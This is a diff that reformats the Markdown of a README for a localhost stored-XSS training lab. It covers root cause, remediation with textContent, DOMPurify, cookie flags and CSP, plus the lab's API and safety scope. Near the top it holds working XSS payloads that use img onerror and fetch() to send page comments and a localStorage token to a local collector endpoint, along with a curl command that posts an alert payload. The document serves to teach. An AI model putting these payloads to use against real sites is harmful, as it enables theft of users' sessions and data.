@@ -263,7 +263,7 @@ To make the impact concrete, you can simulate a full session-hijack flow:
 <img src=x onerror="fetch('/api/comments').then(r=>r.text()).then(t=>fetch('http://localhost:4000/exfil?d='+encodeURIComponent(t)))">
 ```
 
-**Example payload** — exfiltrate localStorage (if the app stored a token there):
+**Example payload** — exfiltrate `localStorage` (if the app stored a token there):
 
 ```
 <img src=x onerror="fetch('http://localhost:4000/exfil?d='+encodeURIComponent(localStorage.getItem('token')||'none'))">
@@ -272,10 +272,10 @@ To make the impact concrete, you can simulate a full session-hijack flow:
 
 ---
 
-🔁 Why Reload Triggers the Payload
+## 🔁 Why Reload Triggers the Payload
 A common misconception is that the browser "re-executes" the stored script. In reality, on every page load the script is re-injected into a fresh document:
 
-text
+```
 Browser loads page
         │
         ▼
@@ -295,121 +295,140 @@ Browser parses the new HTML string
         │
         ▼
 <img onerror> fires → payload executes
-Every reload → new fetch → new innerHTML assignment → new parse → new execution. This is why the payload is persistent from the attacker's perspective: they don't need to re-deliver it.
+```
+Every reload → new `fetch` → new `innerHTML` assignment → new parse → new execution. This is why the payload is persistent from the attacker's perspective: they don't need to re-deliver it.
 
-🔍 Root Cause Analysis
-Stage	What happens	Why it's exploitable
-Input	POST /api/comments accepts message verbatim	No validation, no encoding, no length limit
-Storage	The raw string is kept in memory	Malicious HTML/JS is preserved exactly
-Output	commentsEl.innerHTML = ...c.message...	Browser parses it as HTML; inline event handlers execute
-Execution context	Runs as the localhost:3000 origin	Full access to DOM, cookies (non-HttpOnly), localStorage, and same-origin APIs
-Trigger	load() runs on every visit	Payload re-injected into every fresh document
-The bug is not the <script> tag specifically — it's that untrusted data is treated as HTML. Any construct that the HTML parser can execute (event handlers, javascript: URIs, <svg onload>, etc.) is fair game.
+---
 
-🛡️ How to Fix It (Remediation)
+## 🔍 Root Cause Analysis
+
+| Stage |	What happens | Why it's exploitable |
+|---|---|---|
+| **Input** |	`POST /api/comments` accepts `message` verbatim | No validation, no encoding, no length limit |
+| **Storage** |	The raw string is kept in memory | Malicious HTML/JS is preserved exactly |
+| **Output** | `commentsEl.innerHTML = ...c.message...` |	Browser parses it as HTML; inline event handlers execute |
+| **Execution context** |	Runs as the `localhost:3000` origin |	Full access to DOM, cookies (non-HttpOnly), `localStorage`, and same-origin APIs |
+| **Trigger** |	`load()` runs on every visit |	Payload re-injected into every fresh document |
+
+The bug is not the `<script>` tag specifically — it's that untrusted data is treated as HTML. Any construct that the HTML parser can execute (event handlers, `javascript:` URIs, `<svg onload>`, etc.) is fair game.
+
+---
+
+## 🛡️ How to Fix It (Remediation)
+
 This lab intentionally omits every one of these. In a real application, apply all of them:
 
-1. Encode on output — never use innerHTML for untrusted data
-Vulnerable:
+### 1. Encode on output — never use `innerHTML` for untrusted data
+**Vulnerable:**
 
-javascript
+```
 commentsEl.innerHTML = `<div>${c.message}</div>`;
+```
+
 Safe:
 
-javascript
+```
 const div = document.createElement('div');
 div.textContent = c.message;
 commentsEl.appendChild(div);
+```
+
 If you must render HTML, sanitize it first with DOMPurify:
 
-javascript
+```
 import DOMPurify from 'dompurify';
 commentsEl.innerHTML = DOMPurify.sanitize(c.message);
-2. Set safe cookie attributes
-text
+```
+
+### 2. Set safe cookie attributes
+```
 Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
-HttpOnly — JavaScript cannot read the cookie (blocks cookie theft)
+```
 
-Secure — cookie only sent over HTTPS
+- `HttpOnly` — JavaScript cannot read the cookie (blocks cookie theft)
+- `Secure` — cookie only sent over HTTPS
+- `SameSite` — blocks cross-site request attacks
 
-SameSite — blocks cross-site request attacks
-
-3. Add a strict Content Security Policy
-text
+### 3. Add a strict Content Security Policy
+```
 Content-Security-Policy:
   default-src 'self';
   script-src 'self' 'nonce-<random>';
   object-src 'none';
   base-uri 'none';
-No 'unsafe-inline' — this alone stops the onerror/onload payloads in this lab.
+```
 
-4. Validate input on the server (defense in depth)
-Enforce a max length.
+No `'unsafe-inline'` — this alone stops the `onerror/onload` payloads in this lab.
 
-Reject or strip HTML for plain-text fields.
+### 4. Validate input on the server (defense in depth)
+- Enforce a max length.
+- Reject or strip HTML for plain-text fields.
+- Never rely on client-side validation.
 
-Never rely on client-side validation.
+### 5. Use framework protections
+- React: `{message}` (not `dangerouslySetInnerHTML`)
+- Vue: `{{ message }}` (not `v-html`)
+- Angular: default interpolation (not `[innerHTML]` without sanitizer)
+- Express + template engines: use the engine's auto-escaping (EJS `<%= %>`, Pug `#{}`, Handlebars `{{ }}`)
 
-5. Use framework protections
-React: {message} (not dangerouslySetInnerHTML)
+---
 
-Vue: {{ message }} (not v-html)
+## 📡 API Reference
 
-Angular: default interpolation (not [innerHTML] without sanitizer)
+| Method | Endpoint | Description |
+|---|---|---|
+| `GET` | `/api/comments` | Returns all comments as a JSON array |
+| `POST` | `/api/comments` | Creates a comment. Body: `{ "name": "...", "message": "..." }` |
+| `POST` |	`/api/reset` |	Clears all stored comments (lab convenience) |
 
-Express + template engines: use the engine's auto-escaping (EJS <%= %>, Pug #{}, Handlebars {{ }})
+**Example — post a comment:**
 
-📡 API Reference
-Method	Endpoint	Description
-GET	/api/comments	Returns all comments as a JSON array
-POST	/api/comments	Creates a comment. Body: { "name": "...", "message": "..." }
-POST	/api/reset	Clears all stored comments (lab convenience)
-Example — post a comment:
-
-bash
+```
 curl -X POST http://localhost:3000/api/comments \
   -H "Content-Type: application/json" \
   -d '{"name":"student","message":"<img src=x onerror=alert(1)>"}'
-Example — fetch all comments:
+```
 
-bash
+**Example — fetch all comments:**
+
+```
 curl http://localhost:3000/api/comments
-🔄 Resetting the Lab
+```
+
+---
+
+## 🔄 Resetting the Lab
 To clear all stored comments between exercises:
 
-bash
+```
 curl -X POST http://localhost:3000/api/reset
-Or simply stop and restart the server — comments are in-memory and will be gone.
+```
 
-⚠️ Safety & Scope
-Bind to 127.0.0.1 only. Never port-forward, never expose on a LAN, never publish.
+Or simply **stop and restart the server** — comments are in-memory and will be gone.
 
-Do not use real credentials in this lab. The "session cookie" is fake.
+---
 
-Do not run this on shared infrastructure — a malicious payload from another user could affect your browser.
+## ⚠️ Safety & Scope
 
-Payloads in this README target only localhost. They are educational examples, not tools for attacking third-party systems.
+- Bind to `127.0.0.1` only. Never port-forward, never expose on a LAN, never publish.
+- Do not use real credentials in this lab. The "session cookie" is fake.
+- Do not run this on shared infrastructure — a malicious payload from another user could affect your browser.
+- Payloads in this **README** target only `localhost`. They are educational examples, not tools for attacking third-party systems.
+- Using XSS against systems you do not own or have explicit written permission to test is illegal in most jurisdictions (e.g., under the Computer Fraud and Abuse Act in the US, the Computer Misuse Act in the UK, and equivalent laws elsewhere).
 
-Using XSS against systems you do not own or have explicit written permission to test is illegal in most jurisdictions (e.g., under the Computer Fraud and Abuse Act in the US, the Computer Misuse Act in the UK, and equivalent laws elsewhere).
+If you're studying for a certification (OSCP, CEH, PortSwigger Web Security Academy, etc.), use this **lab** alongside those **curricula** — but keep it offline.
 
-If you're studying for a certification (OSCP, CEH, PortSwigger Web Security Academy, etc.), use this lab alongside those curricula — but keep it offline.
+---
 
-📄 License
+## 📄 License
 This lab is provided for educational purposes only. Use it freely for self-study, classroom instruction, or internal training. The authors accept no liability for misuse.
 
-🙏 Acknowledgements & Further Learning
-OWASP — Cross-Site Scripting (XSS)
+## 🙏 Acknowledgements & Further Learning
 
-OWASP XSS Prevention Cheat Sheet
+- OWASP — Cross-Site Scripting (XSS)
+- OWASP XSS Prevention Cheat Sheet
+- PortSwigger Web Security Academy — XSS
+- MDN — Content Security Policy
+- DOMPurify
 
-PortSwigger Web Security Academy — XSS
-
-MDN — Content Security Policy
-
-DOMPurify
-
-Happy hacking — responsibly. 🛡️
-
-text
-
-Yeh poora README ek hi code block mein hai — upar right corner ke **copy button** se ek click mein copy karke apni `README.md` file mein paste kar do. 🚀
+**Happy hacking — responsibly.** 🛡️
